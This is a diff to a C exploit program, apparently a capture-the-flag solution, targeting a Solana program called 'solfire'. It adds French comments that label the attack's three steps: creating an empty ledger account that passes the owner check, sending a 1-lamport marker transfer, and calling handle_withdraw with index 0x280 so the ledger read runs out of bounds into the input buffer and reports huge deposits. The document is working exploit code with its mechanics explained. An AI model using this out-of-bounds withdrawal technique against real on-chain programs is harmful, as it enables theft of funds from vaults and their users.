@@ -38,6 +38,11 @@
 #define SOLFIRE 5
 
 // SystemInstruction::CreateAccount { lamports, space, owner }  (variant 0)
+// --------------------------------------------------------------------------
+// Etape 1/3 : creation du compte ledger
+//   CreateAccount avec space = 0 et owner = solfire : le controle d'owner passe, mais
+//   le compte ne contient aucune donnee exploitable en lecture normale
+// --------------------------------------------------------------------------
 static uint64_t make_ledger(SolParameters *params, uint8_t nonce) {
   const SolSignerSeed seed = {(const uint8_t *)&nonce, 1};
   const SolSignerSeeds seeds = {&seed, 1};
@@ -63,6 +68,11 @@ static uint64_t make_ledger(SolParameters *params, uint8_t nonce) {
 
 // SystemInstruction::Transfer { lamports } (variant 2): user -> vault, 1 lamport.
 // Used purely as a remote diagnostic marker proving the ledger was created.
+// --------------------------------------------------------------------------
+// Etape 2/3 : marqueur de diagnostic
+//   un transfert de 1 lamport vers la vault, utile pour verifier a distance que le
+//   compte a bien ete cree, sans consommer le chemin vulnerable
+// --------------------------------------------------------------------------
 static uint64_t marker(SolParameters *params) {
   SolAccountMeta meta[] = {
     {params->ka[USER].key,  true, true},
@@ -81,6 +91,11 @@ static uint64_t marker(SolParameters *params) {
 
 // solfire handle_withdraw: ledger index (u32 at [4..8]), amount (u32 at [8..12]),
 // vault nonce at [12].
+// --------------------------------------------------------------------------
+// Etape 3/3 : appel vulnerable
+//   handle_withdraw lit le ledger a data + index*0x10 ; avec index = 0x280 la lecture
+//   sort du compte et tombe dans le buffer MM_INPUT, ce qui donne des depots enormes
+// --------------------------------------------------------------------------
 static uint64_t do_withdraw(SolParameters *params, uint8_t vault_nonce,
                             uint32_t index, uint32_t amount) {
   SolAccountMeta meta[] = {
